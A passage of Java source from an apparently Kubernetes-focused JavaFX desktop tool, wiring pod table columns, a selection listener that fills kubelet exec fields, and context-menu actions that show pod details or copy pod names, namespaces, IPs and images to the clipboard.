        kColName.setCellValueFactory(c -> c.getValue().nameProperty());
        kColStatus.setCellValueFactory(c -> c.getValue().statusProperty());
        kColNode.setCellValueFactory(c -> c.getValue().nodeProperty());
        kColIP.setCellValueFactory(c -> c.getValue().podIPProperty());
        kColContainers.setCellValueFactory(c -> c.getValue().containersProperty());
        kubeletPodTable.getSelectionModel().selectedItemProperty().addListener((obs, oldVal, newVal) -> {
            if (newVal != null) {
                execNamespace.setText(newVal.getNamespace()); execPodName.setText(newVal.getName());
                execContainerName.setText(newVal.getFirstContainer());
                ctx.log("[*] Kubelet已填充: " + newVal.getNamespace() + "/" + newVal.getName() + " (容器: " + newVal.getFirstContainer() + ")");
            }
        });
    }

    private void installPodActions(TableView<PodTableItem> table, Label count) {
        // 列表内容变化和整体替换时都更新数量。
        SimpleListProperty<PodTableItem> items = new SimpleListProperty<>();
        items.bind(table.itemsProperty());
        count.textProperty().bind(items.sizeProperty().asString("共 %d 个 Pod"));
        table.setPlaceholder(new Label("获取 Pod 后，右键或双击记录查看详情"));
        table.setColumnResizePolicy(TableView.CONSTRAINED_RESIZE_POLICY);
        TableRowActions.install(table, "查看 Pod 详情", pod -> {
            JsonObject fields = new JsonObject();
            fields.addProperty("名称", pod.getName());
            fields.addProperty("命名空间", pod.getNamespace());
            fields.addProperty("状态", pod.getStatus());
            fields.addProperty("节点", pod.getNode());
            fields.addProperty("Pod IP", pod.getPodIP());
            fields.addProperty("容器", pod.getContainers());
            fields.addProperty("镜像", pod.getImages());
            ResourceDetails.show(table, pod.getNamespace() + "/" + pod.getName(),
                    pod.getResource() != null ? pod.getResource() : fields, pod.getResource());
        }, pod -> List.of(
                new TableRowActions.Action<>("复制 Pod 名称", item -> ctx.copyToClipboard(item.getName())),
                new TableRowActions.Action<>("复制命名空间", item -> ctx.copyToClipboard(item.getNamespace())),
                new TableRowActions.Action<>("复制 Pod IP", item -> ctx.copyToClipboard(item.getPodIP())),
                new TableRowActions.Action<>("复制镜像", item -> ctx.copyToClipboard(item.getImages()))));
    }
}
